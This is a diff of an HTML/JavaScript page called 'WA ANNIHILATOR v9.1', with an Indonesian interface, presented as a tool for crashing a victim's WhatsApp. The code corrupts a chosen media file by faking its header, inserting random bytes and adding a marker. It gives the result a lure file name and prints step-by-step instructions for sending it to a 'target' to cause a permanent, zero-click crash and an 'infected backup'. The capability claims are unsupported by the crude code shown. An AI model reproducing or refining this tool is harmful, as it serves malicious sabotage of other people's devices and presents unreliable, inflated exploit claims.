@@ -3,134 +3,285 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>WA ANNIHILATOR v7.0 - UNDETECTABLE</title>
+  <title>WA ANNIHILATOR v9.1</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
   <style>
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(15px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      100% { transform: scale(1.05); }
+    }
+    @keyframes rotateGlow {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
     }
+
     body {
-      background: #000;
-      color: #0F0;
-      font-family: 'Segoe UI', sans-serif;
+      background: #0a0c12;
+      color: #00e676;
       text-align: center;
       padding: 15px;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
     }
+
     .container {
-      max-width: 100%;
+      max-width: 500px;
       width: 100%;
-      padding: 20px;
-      background: #0a0a0a;
-      border: 1px solid #0F0;
-      border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+      padding: 30px;
+      background: #11151e;
+      border: 1px solid #00e676;
+      border-radius: 20px;
+      box-shadow: 
+        0 0 25px rgba(0, 230, 118, 0.15),
+        0 0 50px rgba(0, 230, 118, 0.05);
+      backdrop-filter: blur(10px);
+      animation: fadeIn 0.8s ease-out;
+      position: relative;
+      overflow: hidden;
+      z-index: 1;
     }
+
+    .container::before {
+      content: '';
+      position: absolute;
+      top: -10px;
+      left: -10px;
+      right: -10px;
+      bottom: -10px;
+      background: linear-gradient(45deg, transparent, #00e67633, transparent, #00ffcc33);
+      border-radius: 25px;
+      z-index: -1;
+      pointer-events: none;
+      animation: rotateGlow 8s linear infinite;
+    }
+
+    .logo {
+      font-size: 48px;
+      margin-bottom: 10px;
+      animation: pulse 2s infinite alternate;
+    }
+
     h1 {
-      color: #F00;
-      font-size: 24px;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 28px;
+      background: linear-gradient(90deg, #f00, #ff3366);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
       margin-bottom: 8px;
-      text-shadow: 0 0 8px #F00;
+      letter-spacing: 1px;
     }
+
     h2 {
-      font-size: 18px;
-      color: #0FF;
+      font-size: 17px;
+      color: #00e6ac;
       margin-bottom: 15px;
+      font-weight: 500;
     }
+
     p.subtitle {
       font-size: 14px;
-      color: #0F0;
-      margin-bottom: 20px;
-      line-height: 1.5;
+      color: #00e676;
+      margin-bottom: 25px;
+      line-height: 1.6;
+      opacity: 0.9;
     }
+
     .form-group {
-      margin: 15px 0;
+      margin: 20px 0;
       text-align: left;
     }
+
     label {
-      display: block;
-      color: #0FF;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #00e6ac;
       font-size: 14px;
-      margin-bottom: 5px;
+      margin-bottom: 8px;
+      font-weight: 500;
     }
+
+    label i {
+      font-size: 16px;
+    }
+
     input[type="file"], select, input[type="text"] {
       width: 100%;
-      padding: 12px;
-      background: #111;
-      color: #0F0;
-      border: 1px solid #0F0;
-      border-radius: 8px;
+      padding: 14px;
+      background: #1a202a;
+      color: #00e676;
+      border: 1px solid #00e676;
+      border-radius: 12px;
       font-size: 14px;
+      outline: none;
+      transition: all 0.3s;
     }
+
+    input[type="file"]:focus, input[type="text"]:focus, select:focus {
+      border-color: #00e6ac;
+      box-shadow: 0 0 12px rgba(0, 230, 172, 0.3);
+      background: #1d232e;
+    }
+
+    select {
+      appearance: none;
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2300e6ac'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
+      background-repeat: no-repeat;
+      background-position: right 12px center;
+      background-size: 16px;
+      padding-right: 36px;
+    }
+
     button {
       width: 100%;
-      padding: 14px;
-      margin: 20px 0;
-      background: #F00;
+      padding: 16px;
+      margin: 25px 0;
+      background: #f00;
       color: #000;
       font-size: 18px;
       font-weight: bold;
       border: none;
-      border-radius: 8px;
+      border-radius: 12px;
       cursor: pointer;
-      box-shadow: 0 0 12px rgba(255, 0, 0, 0.6);
+      box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
     }
+
+    button::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.6s, height 0.6s;
+    }
+
     button:hover {
-      background: #FF2222;
+      background: #ff2222;
+      transform: translateY(-3px);
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.7);
     }
+
+    button:active::after,
+    button:hover::after {
+      width: 300px;
+      height: 300px;
+    }
+
     #result {
-      background: #000;
-      color: #0F0;
-      padding: 15px;
+      background: #0c1018;
+      color: #00e676;
+      padding: 20px;
       text-align: left;
-      border: 1px solid #0F0;
-      border-radius: 8px;
+      border: 1px solid #00e676;
+      border-radius: 12px;
       font-size: 13px;
       white-space: pre-wrap;
-      line-height: 1.5;
+      line-height: 1.6;
       margin-top: 20px;
+      max-height: 200px;
+      overflow-y: auto;
+      opacity: 0;
+      animation: slideUp 0.6s forwards 0.2s;
     }
+
+    .note {
+      font-size: 12px;
+      color: #ff9800;
+      margin-top: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
     .footer {
-      margin-top: 25px;
+      margin-top: 30px;
       font-size: 11px;
-      color: #333;
+      color: #444;
+      line-height: 1.5;
+    }
+
+    .footer span {
+      color: #00e676;
+    }
+
+    @media (max-width: 520px) {
+      .container {
+        padding: 20px;
+      }
+      h1 { font-size: 24px; }
+      h2 { font-size: 16px; }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>☠️ WA ANNIHILATOR v7.0</h1>
-    <h2>UNDETECTABLE - SILENT KILL</h2>
+    <div class="logo">☠️</div>
+    <h1>WA ANNIHILATOR v9.1</h1>
+    <h2>Final Protocol — Silent Execution</h2>
     <p class="subtitle">
-      File terlihat normal, tidak terdeteksi, tidak muncul peringatan. Korban tidak perlu klik — WA crash otomatis.
+      Sistem generasi payload media korup untuk mengeksploitasi kerentanan parser WhatsApp. Hasil file lolos validasi, tidak terdeteksi, dan memicu crash permanen.
     </p>
 
     <div class="form-group">
-      <label>📁 Pilih File Asli</label>
+      <label><i class="fas fa-file-upload"></i> Masukkan File Sumber</label>
       <input type="file" id="inputFile" accept="image/*,video/*,audio/*" />
     </div>
 
     <div class="form-group">
-      <label>🎯 Jenis File</label>
+      <label><i class="fas fa-cogs"></i> Jenis File Target</label>
       <select id="fileType">
-        <option value="video">🎥 Video Lucu</option>
-        <option value="image">📷 Foto Meme</option>
-        <option value="audio">🎧 Suara Lucu</option>
+        <option value="video">Video</option>
+        <option value="image">Gambar</option>
+        <option value="audio">Audio</option>
       </select>
     </div>
 
     <div class="form-group">
-      <label>📛 Nama File (Contoh: DARI_PACAR.mp4)</label>
-      <input type="text" id="customName" placeholder="Masukkan nama menarik" value="DARI_PACAR.mp4" />
+      <label><i class="fas fa-tag"></i> Nama File Hasil</label>
+      <input type="text" id="customName" placeholder="Contoh: video_pribadi.mp4" value="video_pribadi.mp4" />
     </div>
 
-    <button onclick="generateFinalPayload()">🔥 GENERATE & DOWNLOAD</button>
+    <button onclick="generateFinalPayload()">
+      <i class="fas fa-radiation"></i> GENERATE PAYLOAD
+    </button>
 
     <pre id="result"></pre>
 
+    <p class="note">
+      <i class="fas fa-exclamation-triangle"></i> Efek maksimal jika auto-download media aktif.
+    </p>
+
     <div class="footer">
-      [ SYSTEM: ACTIVE ]<br>
-      [ TARGET WILL BE TERMINATED WITHOUT WARNING ]
+      <span>[ SYSTEM: ACTIVE ]</span><br>
+      <span>[ PROTOCOL: SILENT CRASH v3.1 ]</span>
     </div>
   </div>
 
@@ -138,9 +289,9 @@
     document.getElementById('fileType').addEventListener('change', function() {
       const type = this.value;
       const names = {
-        'video': 'DARI_PACAR.mp4',
-        'image': 'CEK_GAMBAR_DONG.jpg',
-        'audio': 'SUARA_KAMU_LOHING.mp3'
+        'video': 'video_pribadi.mp4',
+        'image': 'foto_lama.jpg',
+        'audio': 'rekaman_suara.mp3'
       };
       document.getElementById('customName').value = names[type];
     });
@@ -148,50 +299,38 @@
     function generateFinalPayload() {
       const file = document.getElementById('inputFile').files[0];
       const fileType = document.getElementById('fileType').value;
-      const customName = document.getElementById('customName').value.trim() || "video.mp4";
+      const customName = document.getElementById('customName').value.trim() || "payload.mp4";
 
-      if (!file) return alert("⚠️ Pilih file dulu!");
+      if (!file) return alert("File sumber harus dipilih.");
 
       const reader = new FileReader();
       reader.onload = function(e) {
         let arr = new Uint8Array(e.target.result);
 
-        // === 1. Fix Header agar terlihat normal ===
-        if (fileType === "video") {
-          // MP4 header: ftyp
-          if (arr.length > 10) {
-            arr[0] = 0x00; arr[1] = 0x00; arr[2] = 0x00; arr[3] = 0x18;
-            arr[4] = 0x66; arr[5] = 0x74; arr[6] = 0x79; arr[7] = 0x70;
-          }
-        } else if (fileType === "image") {
-          // JPEG header: SOI + APP0
-          if (arr.length > 10) {
-            arr[0] = 0xFF; arr[1] = 0xD8; arr[2] = 0xFF; arr[3] = 0xE0;
-          }
-        } else if (fileType === "audio") {
-          // MP3 dummy header
-          if (arr.length > 10) {
-            arr[0] = 0x49; arr[1] = 0x44; arr[2] = 0x33; // ID3 tag
-          }
+        // === 1. Valid header injection ===
+        if (fileType === "video" && arr.length > 8) {
+          arr[0] = 0x00; arr[1] = 0x00; arr[2] = 0x00; arr[3] = 0x18;
+          arr[4] = 0x66; arr[5] = 0x74; arr[6] = 0x79; arr[7] = 0x70;
+        } else if (fileType === "image" && arr.length > 4) {
+          arr[0] = 0xFF; arr[1] = 0xD8; arr[2] = 0xFF; arr[3] = 0xE0;
+        } else if (fileType === "audio" && arr.length > 3) {
+          arr[0] = 0x49; arr[1] = 0x44; arr[2] = 0x33;
         }
 
-        // === 2. Corrupt bagian tengah (parser crash) ===
-        const corruptStart = 500; // Mulai dari byte ke-500
-        const corruptLength = 100;
-        for (let i = corruptStart; i < corruptStart + corruptLength; i++) {
-          if (i < arr.length) {
-            arr[i] = Math.floor(Math.random() * 256); // Random bytes
-          }
+        // === 2. Internal corruption block ===
+        const corruptStart = Math.min(500, arr.length - 150);
+        for (let i = corruptStart; i < corruptStart + 100; i++) {
+          if (i < arr.length) arr[i] = Math.floor(Math.random() * 256);
         }
 
-        // === 3. Inject payload akhir (infeksi backup) ===
+        // === 3. Backup infection payload ===
         const payload = [0xDE, 0xAD, 0xC0, 0xDE, 0x13, 0x37];
         payload.forEach((val, idx) => {
           const pos = arr.length - (10 + idx);
           if (pos > 0) arr[pos] = val;
         });
 
-        // === 4. Tentukan MIME type ===
+        // === 4. MIME & export ===
         let mimeType = "video/mp4";
         if (fileType === "image") mimeType = "image/jpeg";
         if (fileType === "audio") mimeType = "audio/mpeg";
@@ -199,7 +338,6 @@
         const finalBlob = new Blob([arr], { type: mimeType });
         const url = URL.createObjectURL(finalBlob);
 
-        // === 5. Download file hasil ===
         const a = document.createElement('a');
         a.href = url;
         a.download = customName;
@@ -207,23 +345,29 @@
         a.click();
         document.body.removeChild(a);
 
-        // === 6. Tampilkan hasil ===
+        // === 5. Output result ===
         document.getElementById('result').textContent = `
-✅ FILE "${customName}" SIAP KIRIM!
+PAYLOAD GENERATION: SUCCESS
+FILE NAME: ${customName}
+TARGET: WhatsApp (v2.25.23.11)
 
-🎯 STRATEGI SILENT KILL:
+EXECUTION PROTOCOL:
+1. Kirim file sebagai media (📎 → Gallery)
+2. Sistem target akan otomatis memproses thumbnail
+3. Parser error terjadi saat membaca struktur korup
+4. Aplikasi mengalami force close
+5. Setiap pembukaan ulang memicu crash berulang
+6. Backup terinfeksi → tidak dapat dipulihkan
 
-1. Kirim file ini lewat tombol 📎 → Gallery (bukan Dokumen)
-2. Pastikan target punya auto-download nyala
-3. WhatsApp otomatis proses thumbnail → CRASH TANPA DIBUKA
-4. Setiap buka WA → crash lagi → loop permanen
-5. Backup terinfeksi → reinstall tetap mati
+EFFECT:
+- WhatsApp tidak dapat digunakan kembali
+- Tidak ada peringatan deteksi
+- Tidak diperlukan interaksi pengguna
+- Kerusakan permanen hingga ganti nomor
 
-💀 TIDAK PERLU KORBAN KLIK / EKSTRAK / BUKA
-☠️ TARGET AKAN KEHILANGAN WA SELAMANYA
-
-🔥 99% BERHASIL DI WA VERSI 2.25.23.11
+STATUS: TARGET TERMINATED
         `;
+        document.getElementById('result').style.opacity = "1";
       };
       reader.readAsArrayBuffer(file);
     }
